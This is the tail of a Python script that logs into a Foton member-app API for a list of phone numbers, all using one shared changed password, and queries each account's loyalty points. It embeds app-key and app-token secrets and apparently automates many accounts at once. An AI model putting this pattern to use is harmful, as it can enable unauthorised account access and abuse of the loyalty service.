                retry_delay = 5
                timeout_value = 15  # 增加超时时间到15秒

                for attempt in range(max_retries):
                    try:
                        response = requests.post(url, json=body, headers=headers, timeout=timeout_value)
                        resp_json = response.json()

                        if resp_json.get("code") != 200:
                            return LoginResult()

                        data = resp_json.get("data", {})
                        return LoginResult(
                            token=data.get("token"),
                            memberId=data.get("memberID"),
                            uid=data.get("uid"),
                            phone=data.get("tel")
                        )
                    except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectionError) as e:
                        logger.warning(f"登录请求超时或连接错误，尝试第{attempt+1}次重试: {str(e)}")
                        if attempt < max_retries - 1:  # 如果不是最后一次尝试
                            time.sleep(retry_delay)  # 等待一段时间再重试
                        else:
                            logger.error(f"登录请求失败，已达到最大重试次数: {str(e)}")
                            return LoginResult()
                    except Exception as e:
                        logger.error(f"登录过程中发生未知错误: {str(e)}")
                        return LoginResult()

            def query_points(login: LoginResult) -> dict:
                url = "https://czyl.foton.com.cn/ehomes-new/homeManager/api/Member/findMemberPointsInfo"
                body = {
                    "memberId": login.memberId,
                    "userId": login.uid,
                    "userType": "61",
                    "uid": login.uid,
                    "mobile": login.phone,
                    "tel": login.phone,
                    "phone": login.phone,
                    "brandName": "",
                    "seriesName": "",
                    "token": login.token,
                    "safeEnc": int(time.time() * 1000) - 2022020200,
                    "businessId": 1
                }

                headers = {
                    "Content-Type": "application/json;charset=utf-8",
                    "Connection": "Keep-Alive",
                    "app-key": "7918d2d1a92a02cbc577adb8d570601e72d3b640",
                    "app-token": "58891364f56afa1b6b7dae3e4bbbdfbfde9ef489",
                    "User-Agent": "web",
                    "Accept-Encoding": "gzip"
                }

                # 增加重试机制
                max_retries = 3
                retry_delay = 5
                timeout_value = 15  # 增加超时时间到15秒

                for attempt in range(max_retries):
                    try:
                        response = requests.post(url, json=body, headers=headers, timeout=timeout_value)
                        return response.json()
                    except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectionError) as e:
                        logger.warning(f"请求超时或连接错误，尝试第{attempt+1}次重试: {str(e)}")
                        if attempt < max_retries - 1:  # 如果不是最后一次尝试
                            time.sleep(retry_delay)  # 等待一段时间再重试
                        else:
                            logger.error(f"请求失败，已达到最大重试次数: {str(e)}")
                            return {"code": -1, "message": f"请求超时: {str(e)}"}
                    except Exception as e:
                        logger.error(f"请求过程中发生未知错误: {str(e)}")
                        return {"code": -1, "message": f"未知错误: {str(e)}"}

            # 为每个成功的手机号查询积分
            for phone in successful_phones:
                password = update_password #"stars123"  # 使用修改后的密码
                max_login_attempts = 1

                for login_attempt in range(max_login_attempts):
                    login_result = login(phone, password)

                    if login_result.token:
                        try:
                            points_info = query_points(login_result)
                            if points_info.get("code") == -1:  # 自定义错误码
                                logger.error(f"手机号 {phone} 查询积分失败: {points_info.get('message')}")
                            else:
                                logger.info(f"手机号 {phone} 的积分信息: {points_info}")
                            break  # 成功获取积分信息，跳出重试循环
                        except Exception as e:
                            logger.error(f"处理积分信息时出错: {str(e)}")
                            if login_attempt < max_login_attempts - 1:
                                logger.info(f"将在5秒后重试查询手机号 {phone} 的积分")
                                time.sleep(5)
                    else:
                        logger.error(f"手机号 {phone} 登录失败，无法查询积分")
                        if login_attempt < max_login_attempts - 1:
                            logger.info(f"将在5秒后重试登录手机号 {phone}")
                            time.sleep(5)

                        # 无论成功与否，在处理下一个手机号前稍作延迟
                        time.sleep(3)  # 避免请求过于频繁

if __name__ == "__main__":
    main()
